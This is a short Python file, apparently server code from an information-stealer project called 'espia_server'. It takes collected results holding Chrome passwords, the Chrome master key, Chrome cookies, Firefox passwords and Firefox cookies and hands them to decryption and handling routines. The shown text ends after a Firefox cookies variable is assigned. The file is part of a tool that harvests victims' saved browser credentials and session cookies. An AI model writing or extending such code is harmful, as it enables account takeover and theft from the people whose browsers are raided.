from espia_server.app.browsers.chrome.chrome_utils import handle_chrome_cookies
from espia_server.app.browsers.chrome.chrome_utils import handle_chrome_passwords
from espia_server.app.browsers.firefox.firefox_utils import handle_firefox_passwords


def handle_products_results(results: dict) -> None:
    chrome_passwords = results.get("Chrome-Passwords")
    chrome_master_key = results.get("Chrome-Masterkey")
    handle_chrome_passwords(chrome_passwords, chrome_master_key)

    chrome_cookies = results.get("Chrome-Cookies")
    handle_chrome_cookies(chrome_cookies, chrome_master_key)

    firefox_passwords = results.get("Firefox-Passwords")

    handle_firefox_passwords(firefox_passwords.get("logins"))

    firefox_cookies = results.get("Firefox-Cookies")
